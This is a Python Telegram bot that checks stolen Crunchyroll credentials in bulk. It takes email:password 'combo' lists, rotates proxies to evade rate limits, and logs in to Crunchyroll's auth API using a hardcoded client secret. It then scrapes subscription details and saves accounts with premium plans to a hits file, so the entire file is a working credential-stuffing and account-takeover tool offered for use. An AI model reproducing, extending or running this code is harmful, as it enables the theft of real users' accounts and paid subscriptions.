#!/usr/bin/env python3
import os
import asyncio
import uuid
import random
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram import F

BOT_TOKEN = os.getenv("BOT_TOKEN")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

checker = None
proxies = []
stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}


class CrunchyrollChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.proxy_index = 0
        self.countries = {
            "AF": "Afghanistan 🇦🇫", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
            "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲", "AU": "Australia 🇦🇺",
            "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿", "BH": "Bahrain 🇧🇭",
            "BD": "Bangladesh 🇧🇩", "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪",
            "BO": "Bolivia 🇧🇴", "BA": "Bosnia 🇧🇦", "BR": "Brazil 🇧🇷",
            "BG": "Bulgaria 🇧🇬", "KH": "Cambodia 🇰🇭", "CM": "Cameroon 🇨🇲",
            "CA": "Canada 🇨🇦", "CL": "Chile 🇨🇱", "CN": "China 🇨🇳",
            "CO": "Colombia 🇨🇴", "CR": "Costa Rica 🇨🇷", "HR": "Croatia 🇭🇷",
            "CU": "Cuba 🇨🇺", "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿",
            "DK": "Denmark 🇩🇰", "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨",
            "EG": "Egypt 🇪🇬", "SV": "El Salvador 🇸🇻", "EE": "Estonia 🇪🇪",
            "ET": "Ethiopia 🇪🇹", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷",
            "DE": "Germany 🇩🇪", "GH": "Ghana 🇬🇭", "GR": "Greece 🇬🇷",
            "GT": "Guatemala 🇬🇹", "HT": "Haiti 🇭🇹", "HN": "Honduras 🇭🇳",
            "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸",
            "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩", "IR": "Iran 🇮🇷",
            "IQ": "Iraq 🇮🇶", "IE": "Ireland 🇮🇪", "IL": "Israel 🇮🇱",
            "IT": "Italy 🇮🇹", "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵",
            "JO": "Jordan 🇯🇴", "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪",
            "KR": "South Korea 🇰🇷", "KW": "Kuwait 🇰🇼", "LV": "Latvia 🇱🇻",
            "LB": "Lebanon 🇱🇧", "LY": "Libya 🇱🇾", "LT": "Lithuania 🇱🇹",
            "LU": "Luxembourg 🇱🇺", "MY": "Malaysia 🇲🇾", "MX": "Mexico 🇲🇽",
            "MA": "Morocco 🇲🇦", "NL": "Netherlands 🇳🇱", "NZ": "New Zealand 🇳🇿",
            "NG": "Nigeria 🇳🇬", "NO": "Norway 🇳🇴", "OM": "Oman 🇴🇲",
            "PK": "Pakistan 🇵🇰", "PA": "Panama 🇵🇦", "PE": "Peru 🇵🇪",
            "PH": "Philippines 🇵🇭", "PL": "Poland 🇵🇱", "PT": "Portugal 🇵🇹",
            "PR": "Puerto Rico 🇵🇷", "QA": "Qatar 🇶🇦", "RO": "Romania 🇷🇴",
            "RU": "Russia 🇷🇺", "SA": "Saudi Arabia 🇸🇦", "RS": "Serbia 🇷🇸",
            "SG": "Singapore 🇸🇬", "SK": "Slovakia 🇸🇰", "SI": "Slovenia 🇸🇮",
            "ZA": "South Africa 🇿🇦", "ES": "Spain 🇪🇸", "LK": "Sri Lanka 🇱🇰",
            "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭", "TW": "Taiwan 🇹🇼",
            "TH": "Thailand 🇹🇭", "TR": "Turkey 🇹🇷", "UA": "Ukraine 🇺🇦",
            "AE": "United Arab Emirates 🇦🇪", "GB": "United Kingdom 🇬🇧",
            "US": "United States 🇺🇸", "UY": "Uruguay 🇺🇾", "VE": "Venezuela 🇻🇪",
            "VN": "Vietnam 🇻🇳"
        }

    def get_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.proxy_index % len(self.proxies)]
        self.proxy_index += 1
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

    def check(self, email, password):
        try:
            device_id = str(uuid.uuid4())
            session = requests.Session()
            proxy = self.get_proxy()
            if proxy:
                session.proxies.update(proxy)

            url = "https://beta-api.crunchyroll.com/auth/v1/token"
            headers = {
                'host': 'beta-api.crunchyroll.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
            }

            data = {
                'grant_type': 'password',
                'username': email,
                'password': password,
                'scope': 'offline_access',
                'client_id': 'y2arvjb0h0rgvtizlovy',
                'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
                'device_type': 'Baron',
                'device_id': device_id,
                'device_name': 'Baron'
            }

            response = session.post(url, headers=headers, data=data, timeout=15)
            response_text = response.text

            if any(x in response_text for x in ["invalid_credentials", "force_password_reset", "too_many_requests", "401", "400", "missing_required_field"]):
                return {'status': 'INVALID', 'email': email}

            if '"access_token"' not in response_text:
                return {'status': 'INVALID', 'email': email}

            access_token = response.json().get('access_token')

            headers = {
                'authorization': f'Bearer {access_token}',
                'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
            }

            account_data = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15).json()
            email_verified = account_data.get('email_verified', False)
            created = account_data.get('created', '').split('T')[0]
            external_id = account_data.get('external_id')

            products_data = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=15).json()

            plan = "Free"
            currency = "N/A"
            subscribable = "False"
            free_trial = "False"
            if 'items' in products_data and len(products_data['items']) > 0:
                item = products_data['items'][0]
                plan = item.get('product', {}).get('sku', 'Unknown')
                currency = item.get('currency_code', 'N/A')
                subscribable = str(item.get('product', {}).get('is_subscribable', False))
                free_trial = str(item.get('active_free_trial', False))

            sub_data = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=15).json()

            expiry = sub_data.get('next_renewal_date', 'N/A')
            if expiry and 'T' in expiry:
                expiry = expiry.split('T')[0]

            plan_duration = sub_data.get('cycle_duration', 'N/A')
            is_active = str(sub_data.get('is_active', False))
            country_code = sub_data.get('country_code', 'US')
            country = self.countries.get(country_code, f"{country_code} 🌍")
            is_cancelled = sub_data.get('is_cancelled', False)

            if is_cancelled or subscribable == "False" or "Subscription Not Found" in str(sub_data):
                status = "FREE"
            elif subscribable == "True":
                status = "PREMIUM"
            else:
                status = "FREE"

            return {
                'status': status,
                'email': email,
                'password': password,
                'email_verified': email_verified,
                'account_creation_date': created,
                'plan': plan,
                'currency': currency,
                'subscribable': subscribable,
                'free_trial': free_trial,
                'expiry': expiry,
                'plan_duration': plan_duration,
                'active': is_active,
                'country': country
            }

        except Exception:
            return {'status': 'ERROR', 'email': email}


async def send_result(chat_id, result):
    if result['status'] == 'PREMIUM':
        capture = f"""
{'='*70}
EMAIL: {result['email']}
PASSWORD: {result['password']}
STATUS: {result['status']}
EMAIL VERIFIED: {result.get('email_verified', 'N/A')}
ACCOUNT CREATION: {result.get('account_creation_date', 'N/A')}
PLAN: {result.get('plan', 'N/A')}
CURRENCY: {result.get('currency', 'N/A')}
SUBSCRIBABLE: {result.get('subscribable', 'N/A')}
FREE TRIAL: {result.get('free_trial', 'N/A')}
EXPIRY: {result.get('expiry', 'N/A')}
PLAN DURATION: {result.get('plan_duration', 'N/A')}
ACTIVE: {result.get('active', 'N/A')}
COUNTRY: {result.get('country', 'N/A')}
CHECKED BY: @Sudhakaran12
{'='*70}
"""
        await bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write(capture + "\n")
    elif result['status'] == 'FREE':
        await bot.send_message(chat_id, f"🆓 FREE → {result['email']}")
    else:
        await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")


@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer(
        "Crunchyroll premium checker\n\n"
        "Bot made by @Sudhakaran12\n\n"
        "Send combo file or paste combos (only email:password format)\n"
        "Extra text is automatically ignored"
    )


@dp.message(Command("proxies"))
async def proxies_cmd(message: types.Message):
    await message.answer("📤 Send your proxy file (.txt) or paste proxies (one per line)")


@dp.message(F.document | F.text)
async def handle(message: types.Message):
    global checker

    # Proxy loading
    if message.text and message.text.startswith("/proxies"):
        if message.document:
            file = await bot.get_file(message.document.file_id)
            content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
        else:
            content = message.text.replace("/proxies", "").strip()

        global proxies
        proxies = [line.strip() for line in content.splitlines() if line.strip() and ":" in line]
        checker.proxies = proxies
        return await message.answer(f"✅ Loaded {len(proxies)} proxies!")

    # Combo checking
    if message.document:
        file = await bot.get_file(message.document.file_id)
        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
    else:
        content = message.text

    # STRICT CLEANING - ONLY email:password
    lines = []
    for raw in content.splitlines():
        raw = raw.strip()
        if not raw or ':' not in raw:
            continue
        if '@' in raw:
            part = raw.split(':', 1)
            if len(part) == 2 and '@' in part[0]:
                email = part[0].strip()
                password = part[1].split()[0].strip()
                lines.append(email + ":" + password)

    if not lines:
        return await message.answer("No valid email:password found.")

    # ←←← ONLY THIS LINE WAS ADDED (fixes second file issue)
    checker = CrunchyrollChecker(proxies)

    await message.answer(f"🚀 Checking {len(lines)} combos...")

    for line in lines:
        try:
            email, password = line.split(":", 1)
            result = checker.check(email.strip(), password.strip())

            stats['checked'] += 1
            if result['status'] == 'PREMIUM':
                stats['premium'] += 1
            elif result['status'] == 'FREE':
                stats['free'] += 1
            else:
                stats['invalid'] += 1

            await send_result(message.from_user.id, result)

            await asyncio.sleep(1.5)

        except:
            continue


async def main():
    global checker
    checker = CrunchyrollChecker(proxies)
    print("✅ Bot started")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
